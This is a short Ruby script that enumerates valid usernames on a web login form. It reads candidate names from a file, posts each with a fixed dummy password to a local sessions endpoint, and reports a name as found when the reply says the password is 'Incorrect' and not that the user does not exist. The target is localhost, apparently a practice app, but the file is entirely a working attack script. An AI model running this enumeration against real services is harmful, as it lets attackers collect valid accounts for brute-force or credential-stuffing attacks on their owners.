require "net/http"
require "uri"

uri = URI.parse("http://localhost/sessions/")
http = Net::HTTP.new(uri.host, "3000")

File.open("usuarios.txt", "r").each_line do |username|
	# remove the newline
	username = username.chomp
	# puts username
	request = Net::HTTP::Post.new(uri.request_uri)
	request.set_form_data({"email"=>username,"password"=>"n0taL1k3lyp@ssw0rd","commit"=>"Login"})

	response = http.request(request)

	# If response oes not have " doesn&#x27;t exist!" then the user name is valid
	if response.body.include? "Incorrect"
		puts "Found: #{username}"
	end

end